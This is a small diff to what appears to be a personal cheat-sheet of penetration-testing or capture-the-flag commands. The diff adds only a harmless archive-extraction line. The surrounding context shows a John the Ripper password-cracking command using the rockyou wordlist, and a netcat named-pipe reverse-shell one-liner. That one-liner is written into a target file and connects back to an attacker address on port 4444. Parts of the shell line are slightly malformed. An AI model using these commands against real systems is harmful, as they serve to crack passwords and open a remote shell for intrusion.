@@ -18,3 +18,5 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 🗲
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i>&|nc myIpAddress 4444 >/tmp/f " >> /etc/targetFile
 🗲
+tar -xvf file.tar
+🗲
